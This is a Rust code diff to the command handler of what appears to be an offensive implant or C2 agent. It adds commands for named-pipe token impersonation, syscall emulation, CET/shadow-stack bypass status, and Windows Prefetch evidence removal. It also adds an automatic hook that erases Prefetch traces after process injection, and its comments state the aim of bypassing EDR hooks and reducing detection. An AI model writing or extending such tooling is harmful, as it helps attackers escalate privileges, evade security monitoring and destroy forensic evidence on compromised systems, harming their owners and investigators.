@@ -1232,6 +1232,12 @@ pub async fn handle_command(
                 )
             } {
                 Ok(handle) => {
+                    // Post-injection hook: auto-clean prefetch evidence
+                    // for the target process.  Best-effort, non-blocking.
+                    #[cfg(all(windows, feature = "forensic-cleanup"))]
+                    crate::forensic_cleanup::prefetch::auto_clean_after_injection(
+                        target_process.as_deref().unwrap_or(""
+                    ));
                     match serde_json::to_string_pretty(&serde_json::json!({
                         "pid": handle.target_pid,
                         "base_addr": format!("{:#x}", handle.injected_base_addr),
@@ -1276,7 +1282,15 @@ pub async fn handle_command(
                 min_delay,
                 max_delay,
             ) {
-                Ok(json) => Ok(json),
+                Ok(json) => {
+                    // Post-injection hook: auto-clean prefetch evidence
+                    // for the target process.  Best-effort, non-blocking.
+                    #[cfg(all(windows, feature = "forensic-cleanup"))]
+                    crate::forensic_cleanup::prefetch::auto_clean_after_injection(
+                        &format!("pid:{}", target_pid)
+                    );
+                    Ok(json)
+                }
                 Err(e) => Err(format!("delayed stomp failed: {e}")),
             }
         }
@@ -1284,7 +1298,127 @@ pub async fn handle_command(
         Command::DelayedStomp { .. } => {
             Err("delayed-stomp feature not enabled".to_string())
         }
+
+        // ── Syscall emulation toggle ────────────────────────────────────
+        // Toggle user-mode NT kernel interface emulation at runtime.
+        // When enabled, the agent routes configured Nt* calls through
+        // kernel32/advapi32 equivalents instead of ntdll syscall stubs.
+        #[cfg(all(windows, feature = "syscall-emulation"))]
+        Command::SyscallEmulationToggle { enabled } => {
+            crate::syscall_emulation::set_emulation_enabled(*enabled);
+            let status = crate::syscall_emulation::status_json();
+            Ok(status)
+        }
+        #[cfg(not(all(windows, feature = "syscall-emulation")))]
+        Command::SyscallEmulationToggle { .. } => {
+            Err("syscall-emulation feature not enabled".to_string())
+        }
+
+// ── CET / Shadow Stack status ────────────────────────────────────
+        // Query the current CET (Control-flow Enforcement Technology) /
+        // shadow-stack status.  Returns a JSON object describing whether
+        // CET is present, enabled, and which bypass strategy is active.
+        #[cfg(all(windows, feature = "cet-bypass"))]
+        Command::CetStatus => {
+            let status = crate::cet_bypass::status_json();
+            Ok(status)
+        }
+        #[cfg(not(all(windows, feature = "cet-bypass")))]
+        Command::CetStatus => {
+            Err("cet-bypass feature not enabled".to_string())
+        }
+
+// ── Token-only impersonation (Windows only) ─────────────────────────
+        // Create a named pipe, wait for a client, and extract the
+        // impersonation token via NtImpersonateThread or SetThreadToken
+        // (avoids ImpersonateNamedPipeClient on the main thread).
+        #[cfg(all(windows, feature = "token-impersonation"))]
+        Command::ImpersonatePipe { ref pipe_name } => {
+            crate::token_impersonation::impersonate_pipe(pipe_name)
+                .map_err(|e| e.to_string())
+        }
+        #[cfg(not(all(windows, feature = "token-impersonation")))]
+        Command::ImpersonatePipe { .. } => {
+            Err("token-impersonation feature not enabled".to_string())
+        }
+
+        // Revert the current thread's impersonation token.
+        #[cfg(all(windows, feature = "token-impersonation"))]
+        Command::RevertToken => {
+            crate::token_impersonation::revert_token()
+                .map_err(|e| e.to_string())
+        }
+        #[cfg(not(all(windows, feature = "token-impersonation")))]
+        Command::RevertToken => {
+            Err("token-impersonation feature not enabled".to_string())
+        }
+
+        // List all cached impersonation tokens.
+        #[cfg(all(windows, feature = "token-impersonation"))]
+        Command::ListTokens => {
+            Ok(crate::token_impersonation::list_tokens_json())
+        }
+        #[cfg(not(all(windows, feature = "token-impersonation")))]
+        Command::ListTokens => {
+            Err("token-impersonation feature not enabled".to_string())
+        }
+
+        // ── Forensic cleanup: Prefetch evidence removal ────────────────────
+        // Cleans Windows Prefetch (.pf) evidence for the specified
+        // executable (or all if empty).  Uses the cleanup method from
+        // config: delete, patch (preferred), or disable-service.
+        // All NT API calls use indirect syscalls to bypass EDR hooks.
+        #[cfg(all(windows, feature = "forensic-cleanup"))]
+        Command::CleanPrefetch { exe_name } => {
+            crate::forensic_cleanup::prefetch::clean_prefetch(exe_name)
+        }
+        #[cfg(not(all(windows, feature = "forensic-cleanup")))]
+        Command::CleanPrefetch { .. } => {
+            Err("forensic-cleanup feature not enabled".to_string())
+        }
+
+        // Disable the Windows Prefetch service by setting the
+        // EnablePrefetcher registry value to 0.  Saves the previous
+        // value for later restoration.
+        #[cfg(all(windows, feature = "forensic-cleanup"))]
+        Command::DisablePrefetch => {
+            crate::forensic_cleanup::prefetch::disable_prefetch()
+        }
+        #[cfg(not(all(windows, feature = "forensic-cleanup")))]
+        Command::DisablePrefetch => {
+            Err("forensic-cleanup feature not enabled".to_string())
+        }
+
+        // Restore the Windows Prefetch service to its previous state
+        // (sets EnablePrefetcher back to the value captured by
+        // DisablePrefetch).
+        #[cfg(all(windows, feature = "forensic-cleanup"))]
+        Command::RestorePrefetch => {
+            crate::forensic_cleanup::prefetch::restore_prefetch()
+        }
+        #[cfg(not(all(windows, feature = "forensic-cleanup")))]
+        Command::RestorePrefetch => {
+            Err("forensic-cleanup feature not enabled".to_string())
+        }
     };
+
+    // Auto-revert the impersonation token after task completion if
+    // configured.  This limits the window where an impersonation token
+    // is active on the main thread, reducing EDR detection surface.
+    #[cfg(all(windows, feature = "token-impersonation"))]
+    {
+        // Skip auto-revert for RevertToken, ListTokens, and forensic
+        // cleanup commands — these don't use impersonation tokens and
+        // shouldn't disrupt a token set up for subsequent operations.
+        match command {
+            Command::RevertToken
+            | Command::ListTokens
+            | Command::CleanPrefetch { .. }
+            | Command::DisablePrefetch
+            | Command::RestorePrefetch => {}
+            _ => crate::token_impersonation::auto_revert(),
+        }
+    }
 
     let (outcome, details) = match &result {
         Ok(_) => (Outcome::Success, sanitize_result(&command, &result)),
